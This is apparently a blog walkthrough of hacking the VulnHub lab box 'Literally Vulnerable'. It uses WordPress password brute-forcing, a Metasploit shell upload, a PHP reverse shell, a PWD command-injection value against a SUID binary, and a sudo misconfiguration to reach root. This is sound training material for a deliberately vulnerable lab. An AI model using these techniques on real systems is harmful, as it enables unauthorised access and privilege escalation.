Literally Vulnerable is an easy to medium difficulty OSCP style box from [VulnHub](https://www.vulnhub.com). Below are the steps taken to compromise this box.

First, I enumerated open ports with **threader3000**.

Next, I ran **nmap -A -p 21,22,80,65535 [machine ip]** to enumerate the ports to find out more details about what services were running on them.

It appears that there is an FTP server available with anonymous access, 2 HTTP servers on ports 80 and 65535, and SSH open. Let's take a look at the FTP server first. Let's run **ftp [machine ip]** and enter in the username of **anonymous** when prompted. Once connected, run **ls** and you will see a file called **backupPasswords**. Let's run **get backupPasswords** to save this file to our attacker pc.

Let's terminate the ftp connection and run **cat backupPasswords** to see what is in the file.

![Literally Vulnerable backupPasswords](/assets/img/LiterallyVulnerable4.png)

It appears that this contains a list of passwords for something. Let's take a look at the website on port 80 to start with.

It appears that this is a WordPress site, but it didn't load properly. Looking at the links, it is looking for a website named **literally.vulnerable**. Let's run **echo "[machine ip] literally.vulnerable" >> /etc/hosts**.

![Literally Vulnerable update /etc/hosts](/assets/img/LiterallyVulnerable6.png)

Let's reload the website and see if it loads properly.

![Literally Vulnerable Wordpress site fixed](/assets/img/LiterallyVulnerable7.png)

This looks much better. I went to the Wordpress login link at the bottom of the page and tried using the username of **doe** on the login page, but it appeared that user didn't exist. I then tried with admin and used all the passwords in the **backupPassword** file, but none of them worked. I next took a look at the website on port 65535.

![Literally Vulnerable port 65535 website](/assets/img/LiterallyVulnerable8.png)

This appears to be a default configuration of Apache2. Let's run **gobuster dir -u http://literally.vulnerable:65535/ -w /usr/share/wordlists/dirb/big.txt -x .php,.txt -t 50**. It appears that there is a directory called **/phpcms**. Let's take a look at it.

![Literally Vulnerable gobuster port 65535](/assets/img/LiterallyVulnerable9.png)

It appears that this site has a password protected post by a user named **notadmin**. 

![Literally Vulnerable Wordpress](/assets/img/LiterallyVulnerable10.png)

I scrolled down and went to the login page. We know one of the user login names is **notadmin** based on who is posting. Let's see what we can find with **wpscan** for this site. Let's run **wpscan --url http://literally.vulnerable:65535/phpcms/ --enumerate**. This ends up returning 2 users, **maybeadmin** and **notadmin**.

![Literally Vulnerable wpscan 65535](/assets/img/LiterallyVulnerable11.png)

Let's try to crack one of these users with the passwords list we obtained earlier with **wpscan --url http://literally.vulnerable:65535/phpcms/ --usernames maybeadmin, notadmin --passwords backupPasswords**. After a few moments, we will crack the password for maybeadmin

![Literally Vulnerable maybeadmin password](/assets/img/LiterallyVulnerable12.png)

Let's navigate to **http://literally.vulnerable:65535/phpcms/wp-login.php** and attempt to login with the username **maybeadmin** and the password you just uncovered for this user.

![Literally Vulnerable WordPress dashboard](/assets/img/LiterallyVulnerable13.png)

Success! Let's see what information we can uncover. Let's take a look at the secure post we didn't have access to at the beginning. Click on **Posts** on the left hand menu and then you should be able to click on **Secure Post**

![Literally Vulnerable Secure Post](/assets/img/LiterallyVulnerable14.png)

This provides you with the credentials for **notadmin**. 

![Literally Vulnerable notadmin](/assets/img/LiterallyVulnerable15.png)

Let's login with this user's credentials, as we are not able to edit themes or add in/modify plugins as maybeadmin.

![Literally Vulnerable notadmin login](/assets/img/LiterallyVulnerable16.png)

Awesome **notadmin** is the admin to this WordPress site. Let's click on **Appearance** followed by **Theme Editor** so we can modify a PHP page with a reverse shell.

![Literally Vulnerable theme editor](/assets/img/LiterallyVulnerable17.png)

Next, on the right hand side, click on **404 Template** so we can paste in the reverse shell from [PenTestMonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). Make sure to modify the IP address and port to match what you want to use on your attacker PC. Once finished, click on **Update File**.

![Literally Vulnerable PHP reverse shell](/assets/img/LiterallyVulnerable18.png)

Unfortunately, this results in an error message and we aren't able to save the changes to the PHP file. 

![Literally Vulnerable update failed](/assets/img/LiterallyVulnerable19.png)

Let's see if there's a MetaSploit module we can use instead. Let's launch metasploit with **msfconsole** and then run **search wp_admin**

![Literally Vulnerable msfconsole](/assets/img/LiterallyVulnerable20.png)

Let's attempt this exploit with **use exploit/unix/webapp/wp_admin_shell_upload ** and then run **show options**

![Literally Vulnerable msfconsole2](/assets/img/LiterallyVulnerable21.png)

Let's use **set PASSWORD [password from wpscan], set USERNAME notadmin, set TARGETURI /phpcms/, set RHOSTS [machine ip], set RPORT 65535** and run **show options** again to confirm all the options are set.

![Literally Vulnerable msfconsole3](/assets/img/LiterallyVulnerable22.png)

once enterd, type in **exploit** and press enter to start the exploit. You will soon get a meterpreter connection. Let's run **shell** to get to a shell and run **whoami** to see who we are logged in as.

![Literally Vulnerable meterpreter shell](/assets/img/LiterallyVulnerable23.png)

Let's see if we can upgrade our shell. After some trial and error it appears that python3 is installed, and we can get a shell with **python3 -c 'import pty; pty.spawn("/bin/sh")'**. Next, I navigated to the user home directory with **cd /home** and ran **ls** to see what was present there. It appears there are two users, **doe** and **john**. Let's go to doe's home directory with **cd doe**. The first flag is here, but we aren't able to read it. There's also a noteFromAdmin and an executable named **itseasy** that is a SUID that runs as the user **john**.

![Literally Vulnerable doe home folder](/assets/img/LiterallyVulnerable24.png)

Let's run the program with **./itseasy**. It appears to print the user's home directory, which is typically stored in the **$PWD** environmental variable. 

![Literally Vulnerable itseasy](/assets/img/LiterallyVulnerable25.png)

Let's modify the PWD variable to run bash instead with **export PWD=';/bin/bash'**. This will change this variable to execute a bash shell. Let's run **./itseasy**. You should now have a shell as john.

![Literally Vulnerable john shell](/assets/img/LiterallyVulnerable27.png)

Let's navigate to john's home directory with **cd /home/john** and run **ls -al** to see what's there. The user.txt file is present here, which can be viewed with **cat user.txt**.

![Literally Vulnerable user.txt](/assets/img/LiterallyVulnerable28.png)

At this point, I wanted to see if I could find any files that john owned throughout the victim machine, so I ran **find / -group john 2>/dev/null** which will eliminate any error messages and return only the files john has access to.

![Literally Vulnerable john owned files](/assets/img/LiterallyVulnerable29.png)

One stood out, **/home/john/.local/share/tmpFiles/myPassword**. Let's run **cat /home/john/.local/share/tmpFiles/myPassword**. This provides you with a note stating that john's password is encoded in base64. 

![Literally Vulnerable myPassword](/assets/img/LiterallyVulnerable30.png)

Let's run **echo "[base64 encoded password]"\|base64 -d**. This should provide you with john's credentials:

![](/assets/img/LiterallyVulnerable31.png)

Let's open a new terminal window on our attacker pc and run **ssh john@[machine.ip]** and enter the password that was just decoded.

![Literally Vulnerable SSH](/assets/img/LiterallyVulnerable32.png)

Let's run **sudo -l** and we see that john can run **/var/www/html/test.html** as root

![Literally Vulnerable sudo -l](/assets/img/LiterallyVulnerable33.png)

Let's navigate to that folder with **cd /var/www/html** and run **touch test.html**. Unfortunately, we are not able to create this file here with john.

![Literally Vulnerable Permission denied](/assets/img/LiterallyVulnerable34.png)

However, this is under a folder that www-data has access to. Let's go back to the other terminal window and type **exit** to leave the shell as john and go back to the **www-data** user.

![Literally Vulnerable www-data](/assets/img/LiterallyVulnerable35.png)

Let's run **touch /var/www/html/test.html** and see what happens

![Literally Vulnerable touch test.html](/assets/img/LiterallyVulnerable36.png)

Success! Let's run **echo "/bin/bash" >> /var/www/html/test.html** and **chmod +x /var/www/html/test.html**

![Literally Vulnerable update test.html](/assets/img/LiterallyVulnerable37.png)

This will allow it to run a bash shell as root since it is now executable. Next, go back to your SSH session as john and run **sudo ./test.html**. You should now have a root shell!

![Literally Vulnerable root shell](/assets/img/LiterallyVulnerable38.png)

Now, we can run **cd /root** followed by **ls** and **cat root.txt** to get the root flag. We can also run **cat /home/doe/local.txt** to get the local.txt flag from earlier.
